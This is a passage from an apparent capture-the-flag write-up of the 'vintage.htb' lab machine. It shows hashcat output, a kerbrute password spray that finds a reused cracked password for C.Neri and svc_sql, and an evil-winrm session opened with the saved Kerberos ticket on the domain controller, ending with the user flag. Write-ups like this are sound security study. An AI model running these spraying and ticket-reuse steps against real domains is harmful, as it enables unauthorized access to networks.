Recovered........: 1/3 (33.33%) Digests (total), 1/3 (33.33%) Digests (new), 1/3 (33.33%) Salts
Progress.........: 43033155/43033155 (100.00%)
Rejected.........: 0/43033155 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]

Started: Wed Jan  1 13:36:53 2025
Stopped: Wed Jan  1 13:37:03 2025
```

### 3.5. Moving to `C.Neri`

`svc_sql` appears to be a dead end as it doesn't seem to have any useful access, but the password was just crack - let's try password spray to check for password reuse:

```console
root@kali:~# pipx install kerbrute
  installed package kerbrute 0.0.2, installed using Python 3.12.8
  These apps are now globally available
    - kerbrute
⚠️  Note: '/root/.local/bin' is not on your PATH environment variable. These apps will not be globally accessible until your PATH is updated. Run `pipx ensurepath` to automatically add it, or manually
    modify your PATH in your shell's config file (e.g. ~/.bashrc).
done! ✨ 🌟 ✨

root@kali:~# .local/bin/kerbrute -users users.lst -password Zer0the0ne -domain vintage.htb -dc-ip dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Valid user => Administrator
[*] Blocked/Disabled user => Guest
[*] Blocked/Disabled user => krbtgt
[*] Valid user => DC01$
[*] Valid user => gMSA01$
[*] Valid user => FS01$
[*] Valid user => M.Rossi
[*] Valid user => R.Verdi
[*] Valid user => L.Bianchi
[*] Valid user => G.Viola
[*] Stupendous => C.Neri:Zer0the0ne
[*] Saved TGT in C.Neri.ccache
[*] Valid user => P.Rosa
[*] Stupendous => svc_sql:Zer0the0ne
[*] Saved TGT in svc_sql.ccache
[*] Valid user => svc_ldap [NOT PREAUTH]
[*] Valid user => svc_ark [NOT PREAUTH]
[*] Valid user => C.Neri_adm
[*] Valid user => L.Bianchi_adm
```

`kerbrute` has already saved TGT in `C.Neri.ccache`, let's go ahead and use it:

```console
root@kali:~# export KRB5CCNAME=C.Neri.ccache

root@kali:~# evil-winrm -i dc01.vintage.htb -r vintage.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
vintage\c.neri S-1-5-21-4024337825-2033394866-2055507597-1115


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
VINTAGE\ServiceManagers                     Group            S-1-5-21-4024337825-2033394866-2055507597-1137 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Get the `user.txt`

```pwsh
PS C:\Users\C.Neri\Documents> hostname
dc01
PS C:\Users\C.Neri\Documents> type ..\Desktop\user.txt
8a6d2f23df458774f9168aa764aaa2e6
```
